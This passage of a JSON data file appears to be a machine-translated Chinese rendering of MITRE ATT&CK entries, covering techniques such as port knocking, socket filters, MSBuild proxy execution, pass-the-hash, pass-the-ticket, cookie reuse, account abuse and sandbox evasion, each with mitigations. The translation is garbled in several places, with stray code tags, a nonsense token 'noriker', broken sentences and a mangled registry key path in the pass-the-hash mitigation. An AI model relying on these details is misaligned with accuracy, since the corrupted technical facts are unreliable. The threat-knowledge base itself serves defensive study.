          "content": "在后来的Windows（10+）版本中，"
        },
        {
          "type": "code",
          "content": " pubprn.vbs "
        },
        {
          "type": "text",
          "content": "已更新，以防止远程站点的代理执行。这是通过将第二个参数中指定的协议限制为"
        },
        {
          "type": "code",
          "content": " ldap：// "
        },
        {
          "type": "text",
          "content": "，vice "
        },
        {
          "type": "code",
          "content": "脚本："
        },
        {
          "type": "text",
          "content": " noriker来完成，该协议可通过HTTP（S）用于引用远程代码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，更新Windows Defender应用程序控制策略，以包括阻止PubPRN的旧版本的规则。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在给定的环境中，某些可用于执行其他程序的签名脚本可能不需要。如果给定系统或网络不需要这些脚本，则使用配置的应用程序控制以阻止执行这些脚本，以防止对手的潜在滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.001",
    "name": "Port Knocking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用端口敲门来隐藏用于持久性或命令和控制的开放端口。为了启用端口，对手会将一系列尝试的连接发送到预定义的封闭端口序列。序列完成后，打开端口通常由基于主机的防火墙完成，但也可以通过自定义软件实现。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于听力端口的动态开放，以及在另一个系统上与侦听服务器的连接的启动，已经观察到了这一技术。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过不同的方法进行触发信号数据包的观察。最初由CD00R实施的一种手段是使用LibPCAP库来嗅探有关数据包。另一种方法利用了原始插座，这使恶意软件能够使用已打开的端口，以供其他程序使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.002",
    "name": "Socket Filters",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将过滤器连接到网络插座以监视，然后激活用于持久或命令和控制的后门。使用升高的权限，对手可以使用诸如"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "库之类的功能打开插座并安装过滤器，以允许或禁止某些类型的数据通过套接字。过滤器可以应用于通过指定的网络接口（如果未指定）的所有流量（或每个接口）。当网络接口接收到匹配过滤器标准的数据包时，可以在主机上触发其他操作，例如反向外壳的激活。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了建立连接，对手将制作的数据包发送到与已安装的滤波器标准相匹配的目标主机。对手已经使用这些套接字过滤器来触发植入物的安装，进行ping背部并调用命令壳。与这些插座过滤器的通信也可以与协议隧道结合使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "安装的任何类似Unix的平台上安装过滤器，也可以使用"
        },
        {
          "type": "code",
          "content": " winpcap "
        },
        {
          "type": "text",
          "content": "安装</code>。对手可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "与"
        },
        {
          "type": "code",
          "content": " pcap_setfilter "
        },
        {
          "type": "text",
          "content": "或标准库功能"
        },
        {
          "type": "code",
          "content": " setSockopt "
        },
        {
          "type": "text",
          "content": " so_attach_filter </code> options setsockopt </code>。由于插座连接在收到数据包之前不活动，因此由于主机上缺乏活动，低CPU开销以及对原始插座使用情况的可见性有限，因此可能难以检测此行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1127.001",
    "name": "MSBuild",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Trusted Developer Utilities Proxy Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用MSBUILD通过受信任的Windows实用程序来代理代码。msbuild.exe（Microsoft Build Engine）是Visual Studio使用的软件构建平台。它处理XML格式化的项目文件，以定义加载和构建各种平台和配置的要求。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以滥用MSBUILD来代理恶意代码。.NET版本4中引入的MSBUILD的内联任务功能允许将C＃或Visual Basic Code插入到XML项目文件中。MSBUILD将编译并执行内联任务。MSBUILD.EXE是签名的Microsoft二进制文件，因此，当它使用这种方式时，它可以执行任意代码和绕过应用程序控制防御，该防御措施已配置为允许msbuild.exe执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "MSBUILD.EXE在环境中可能不需要，如果不使用，则应删除。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "如果给定系统或网络不需要为了防止对手的潜在滥用，则使用为阻止"
            },
            {
              "type": "code",
              "content": " msbuild.exe "
            },
            {
              "type": "text",
              "content": "的应用程序控件。例如，在Windows 10和Windows Server 2016及更高版本中，Windows Defender应用程序控制（WDAC）策略规则可以应用于阻止"
            },
            {
              "type": "code",
              "content": " msbuild.exe </code "
            },
            {
              "type": "text",
              "content": "应用程序并防止滥用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.001",
    "name": "Application Access Token",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的应用程序访问令牌来绕过远程系统上典型的身份验证过程，并访问受限制的帐户，信息或服务。这些令牌通常从用户或服务中被盗，并用来代替登录凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "应用程序访问令牌用于代表用户或服务提出授权的API请求，通常用于访问云，基于容器的应用程序和软件AS-A-Service（SaaS）中的资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Oauth是一个常用的框架，它向用户发出以访问系统的方式。这些框架用于验证用户并确定允许用户执行的操作。确定身份后，代币允许授权操作，而无需传递用户的实际凭据。因此，令牌的妥协可以通过恶意应用程序授予对其他站点资源的对手访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，借助基于云的电子邮件服务，一旦将OAuth访问令牌授予了恶意应用程序，如果授予“刷新”启用背景访问权限，它可能会长期访问用户帐户的功能。使用Oauth访问令牌，对手可以使用用户授予的REST API执行诸如电子邮件搜索和联系枚举之类的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "受损的访问令牌可以用作损害其他服务的第一步。例如，如果令牌赠款可以访问受害者的主要电子邮件，则对手可以通过触发遗忘的密码例程来扩展目标订阅的所有其他服务的访问。在AWS和GCP环境中，对手可以触发具有另一个用户帐户特权的短期访问令牌的请求。然后，对手可以使用此代币请求数据或执行原始帐户无法进行的操作。如果对此功能的权限进行了错误配置，例如，通过允许所有用户请求特定帐户的令牌 - 对手可能能够获得对云帐户的初始访问权限或升级其特权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过令牌直接访问API会否定第二个身份验证因子的有效性，并且可能不受更改密码等直观对策的影响。例如，在AWS环境中，损害用户AWS API凭据的对手可能能够使用"
        },
        {
          "type": "code",
          "content": " sts：getFederationToken </code "
        },
        {
          "type": "text",
          "content": " api调用来创建联合用户会话，该会话的权限与原始权限相同用户，即使原始用户凭据被停用，也可能会持续。此外，即使在服务提供商的端情况下，在API频道上的访问滥用也可能很难检测到，因为访问仍然可以与合法的工作流程充分保持一致。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "管理员应审核所有云和容器帐户，以确保它们是必要的，并且授予他们的权限是适当的。在可能的情况下，应禁用代表其他帐户的临时帐户令牌的能力。此外，管理员可以利用审计工具来监视因OAUTH 2.0访问而进行的操作。例如，审核报告使管理员能够确定特权升级动作，例如角色创建或策略修改，这可以是初始访问后执行的操作。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "应在包含通过访问电子邮件服务获得的敏感信息的电子邮件通信之间执行文件加密。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "更新公司政策以限制可以将哪些类型的第三方应用程序添加到链接到公司信息，帐户或网络的任何在线服务或工具中（例如Google，Microsoft，Dropbox，Basecamp，Github）。但是，与其为此提供高级指导，不如说是非常具体的 - 包括由批准的应用程序的列表，并拒绝所有其他未列入列表。管理员还可以通过管理门户（例如Azure Portal）阻止最终用户的同意，从而使用户无法通过OAuth授权第三方应用程序并强迫行政同意。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.002",
    "name": "Pass the Hash",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的密码哈希“传递”，以在环境中横向移动，绕过普通的系统访问控件。通过哈希（PTH）是一种在不访问用户的ClearText密码的情况下对用户进行身份验证的方法。此方法绕过需要通用密码的标准身份验证步骤，直接进入使用密码哈希的身份验证部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "执行PTH时，使用凭据访问技术捕获了使用的帐户的有效密码哈希。捕获的哈希与PTH一起使用以作为该用户身份验证。经过身份验证后，PTH可用于在本地或远程系统上执行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用被盗的密码哈希“覆盖哈希”。与PTH相似，这涉及使用密码哈希作为用户身份验证，但也使用密码哈希创建有效的Kerberos票证。然后，该票可以用于执行通过票证攻击。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制跨系统的凭据重叠，以防止凭证损害损害，并降低对手在系统之间执行横向运动的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "将补丁KB2871997应用于Windows 7和更高的系统，以限制本地管理员组中帐户的默认访问。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "启用通过哈希缓解措施将UAC限制应用于网络登录的本地帐户。关联的注册表密钥位于"
            },
            {
              "type": "code",
              "content": " hklm \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System \\ System \\ LocalAccountTokenTokenFilterPolicy "
            },
            {
              "type": "text",
              "content": "。"
            }
          ],
          [
            {
              "type": "text",
              "content": "通过GPO：计算机配置> [策略]>管理模板> SCM：通过哈希缓解措施：将UAC限制应用于网络登录的本地帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "不允许域用户在多个系统上的本地管理员组中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.003",
    "name": "Pass the Ticket",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的Kerberos门票“通过票证”，以绕过正常的系统访问控件在环境中横向移动。通过票证（PTT）是一种使用Kerberos门票对系统进行认证的方法，而无需访问帐户的密码。Kerberos身份验证可以用作向远程系统横向移动的第一步。"
        }
      ],
      [
        {
          "type": "text",
          "content": "预先建立PTT时，有效的有效帐户的有效Kerberos门票将由OS凭据转储捕获。可以根据访问级别获得用户的服务票或票证授予票（TGT）。服务票允许访问特定资源，而TGT可以用来从票务授予服务（TGS）请求服务票，以访问用户具有特权访问权限的任何资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以为使用Kerberos作为身份验证机制的服务获得一张银票，并用于生成门票以访问该特定资源和托管资源的系统（例如SharePoint）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用密钥分配服务帐户KRBTGT帐户NTLM Hash获得域的金票，该帐户可以为Active Directory中的任何帐户生成TGT。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以使用其他用户信息，例如被盗密码哈希或AES密钥创建有效的Kerberos票。例如，“覆盖哈希”涉及使用NTLM密码哈希作为用户进行身份验证（即通过哈希），同时还使用密码哈希创建有效的Kerberos票证。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "要包含先前生成的金票的影响，请两次重置内置的KRBTGT帐户密码，这将使使用Krbtgt Hash和其他由IT派生的Kerberos门票创建的所有现有金票无效。对于每个域，请更改KRBTGT帐户密码一次，强制复制，然后第二次更改密码。考虑每180天旋转一次旋转KRBTGT帐户密码。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将域管理员帐户权限限制为域控制器和有限的服务器。将其他管理功能委托给单独的帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "不允许用户成为多个系统的本地管理员。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550.004",
    "name": "Web Session Cookie",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Use Alternate Authentication Material",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用被盗的会话cookie对Web应用程序和服务进行身份验证。由于会话已经进行身份验证，因此该技术绕过了一些多因素身份验证协议。"
        }
      ],
      [
        {
          "type": "text",
          "content": "身份验证cookie通常用于Web应用程序，包括基于云的服务，在用户对服务进行身份验证之后，因此未传递凭据，并且不需要经常进行重新认证。cookies通常在长时间内有效，即使未积极使用Web应用程序。通过窃取Web会话cookie或Web cookie获得cookie后，对手可以将cookie导入其控制的浏览器，然后只要会话cookie处于活动状态，就可以将网站或应用程序用作用户。登录到网站后，对手可以访问敏感信息，阅读电子邮件或执行受害者帐户具有执行许可的操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "有一些恶意软件定位会话cookie绕过多因素身份验证系统的示例。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "将浏览器或任务配置为定期删除持续的cookie。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.001",
    "name": "Default Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得默认帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。默认帐户是一个内置的OS，例如Windows系统上的来宾或管理员帐户。默认帐户还包括其他类型的系统，软件或设备（包括AWS中的root用户帐户和kubernetes中的默认服务帐户）上的默认工厂/提供商集帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认帐户不仅限于客户端机器，还包括用于设备（例如内部，开源或商业）等设备（例如网络设备和计算机应用程序）的帐户。带有用户名和密码组合的电器对不更改安装后的组织构成了严重威胁，因为它们是对手的容易目标。同样，对手也可以利用公开披露或被盗的私钥或凭证材料来合法地通过远程服务连接到远程环境。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.002",
    "name": "Domain Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得和滥用域帐户的证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。域帐户是由Active Directory域服务管理的域帐户，在该服务域服务中，在该域的一部分中配置了访问和权限。域帐户可以涵盖用户，管理员和服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过各种方式（例如OS凭据转储或重复使用密码重复使用）妥协域帐户，其中一些域名具有高度特权，从而允许访问该域的特权资源。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得对手获得广泛访问的情况。除非受到严格控制并分割帐户的使用，否则请勿将用户或管理域帐户跨系统组合放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。如果获得帐户凭据，则限制整个系统的凭据重叠，以防止访问。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.003",
    "name": "Local Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得当地帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的手段。本地帐户是由组织配置的，供用户使用，远程支持，服务或单个系统或服务上的管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当地帐户也可能被滥用，以通过OS凭证倾销来提高特权和收获凭据。密码重复使用可能允许在网络上滥用一组机器，以进行特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审核本地帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。限制用于日常运营的本地管理员帐户的使用，这些帐户可能会使它们暴露于潜在的对手。"
            }
          ],
          [
            {
              "type": "text",
              "content": "例如，审核在Kubernetes中使用服务帐户的使用，并避免自动授予他们访问Kubernetes API（如果不需要）。实施圈量也可能有助于防止在域上重用本地管理员凭据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.004",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "云环境中的有效帐户可能会使对手能够执行动作以实现初始访问，持久性，特权升级或防御逃避。云帐户是由组织创建和配置的，供用户使用，远程支持，服务或云服务提供商或SaaS应用程序中的资源管理。云帐户可以仅存在于云中，也可以通过与其他身份源（例如Windows Active Directory）联合通过联邦来源在本地系统和云之间连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "服务或用户帐户可以通过蛮力，网络钓鱼或其他各种访问环境的方式来针对对手。联邦帐户可能是对手影响本地系统和云环境的途径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在折衷的云帐户上创建持久的额外云凭据，以保持环境中的持久性。这些凭据也可以用于绕过安全控制，例如多因素身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云帐户还可以通过环境中的各种方式假设临时提高云访问或其他特权。在角色分配或角色假设策略中进行的错误配置可能允许对手使用这些机制来利用帐户预期范围之外的权限。此类特权帐户可用于通过云API或其他方法从在线存储帐户和数据库中收集敏感数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用不支持MFA的旧版身份验证，而需要使用现代身份验证协议。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "对云帐户，尤其是特权帐户使用多因素身份验证。这可以以多种形式（例如硬件，虚拟，SMS）实现，也可以使用管理报告功能进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保云帐户，特别是特权帐户，在网络上的所有系统中都具有复杂的独特密码。密码和访问密钥应定期旋转。如果凭据在不知情的情况下损害了凭据，这限制了时间凭据可用于访问资源。云服务提供商可能会跟踪访问密钥年龄，以帮助审核并确定可能需要旋转的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "经常查看特权云帐户许可级别，以寻找可以允许对手获得广泛访问的人，例如Azure AD中的全球管理员和特权角色管理员。这些评论还应检查是否创建了未授权的新特权云帐户。例如，在Azure Ad环境中，请求警报以通知帐户何时在不使用特权角色的情况下进行了很多天，因为这些角色可以被删除。考虑使用临时，即时（JIT）特权访问Azure AD资源，而不是永久分配特权角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用户帐户并删除那些不活动或不必要的帐户。限制用户帐户创建其他帐户的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1497.001",
    "name": "System Checks",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种系统检查来检测和避免虚拟化和分析环境。这可能包括根据指示虚拟机环境（VME）或沙盒的伪像的检查结果的改变行为。如果对手发现VME，他们可能会改变其恶意软件以使受害者脱离受害者或掩盖植入物的核心功能。他们还可以在删除次要或其他有效载荷之前搜索VME工件。对手可以使用自动化发现期间虚拟化/沙盒逃避中学到的信息来塑造跟进行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "特定的检查将根据目标和/或对手而有所不同，但可能涉及诸如Windows Management Instrumentation，PowerShell，系统信息发现和查询注册表之类的行为，以获取系统信息并搜索VME文物。对手可以在内存，过程，文件系统，硬件和/或注册表中搜索VME工件。对手可以使用脚本将这些检查自动化为一个脚本，然后将程序退出如果确定系统为虚拟环境，则将其退出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "检查可能包括通用系统属性，例如主机/域名和网络流量的示例。对手还可以检查网络适配器地址，CPU核心计数以及可用的内存/驱动器大小。"
        }
      ],
      [
        {
          "type": "text",
          "content": "其他常见的检查可能会列举这些应用程序所独有的服务，系统上的程序，与虚拟机应用有关的字符串制造商/产品字段以及特定于VME的硬件/处理器说明。在诸如VMware之类的应用程序中，对手也可以使用特殊的I/O端口来发送命令并接收输出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "硬件检查（例如风扇，温度和音频设备的存在）也可以用于收集可以指示虚拟环境的证据。对手也可能会查询这些设备的特定读数。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1497.002",
    "name": "User Activity Based Checks",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种用户活动检查来检测和避免虚拟化和分析环境。这可能包括根据指示虚拟机环境（VME）或沙盒的伪像的检查结果的改变行为。如果对手发现VME，他们可能会改变其恶意软件以使受害者脱离受害者或掩盖植入物的核心功能。他们还可以在删除次要或其他有效载荷之前搜索VME工件。对手可以使用自动化发现期间虚拟化/沙盒逃避中学到的信息来塑造跟进行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以根据变量在主机上搜索用户活动，例如鼠标移动和点击的速度/频率，浏览器历史记录，缓存，书签或常见目录中的文件数量，例如家庭或桌面。其他方法可能会在激活恶意代码之前与系统的特定互动，例如等待文档在激活宏或等待用户双击嵌入式图像以激活激活之前关闭。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1497.003",
    "name": "Time Based Evasion",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种基于时间的方法来检测和避免虚拟化和分析环境。这可能包括列举基于时间的属性，例如正常运行时间或系统时钟，以及使用计时器或其他触发器避免使用虚拟机环境（VME）或沙盒，特别是自动化或仅在有限的多少时间。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以采用各种基于时间的逃避，例如使用程序化睡眠命令或本机系统调度功能在初始执行时延迟恶意软件功能（例如：计划/计划/作业）。延迟也可能基于等待特定的受害者条件（例如：系统时间，事件等）或采用预定的多阶段渠道，以避免分析和审查。"
        }
      ],
      [
        {
          "type": "text",
          "content": "良性命令或其他操作也可以用于延迟恶意软件的执行。循环或其他不必要的命令重复（例如ping）可用于延迟恶意软件的执行，并可能超过自动分析环境的时间阈值。通常称为API锤式的另一种变体涉及对本机API功能进行各种调用，以延迟执行（同时也可能与垃圾数据将分析环境超载分析环境）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以将时间用作指标来检测沙盒和分析环境，尤其是那些试图操纵时间机制以模拟时间较长的时间的人。例如，对手可能能够通过在执行睡眠函数之前和之后对环境时间戳的预期值进行采样和计算，以识别沙盒加速时间。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1600.001",
    "name": "Reduce Key Space",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Weaken Encryption",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过降低加密通信的密码强度来减少通过网络传输的数据所需的努力水平。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过减少软件将授权转换为密文的关键大小来削弱受损的网络设备上的加密软件（例如，从数百或数千个字节到仅几个字节）。结果，对手大大减少了无需密钥解密受保护信息所需的努力。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用修改系统映像引入到系统中的网络设备CLI中使用的专用命令来修改所使用的密钥大小和其他加密参数，以更改设备的配置。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1600.002",
    "name": "Disable Crypto Hardware",
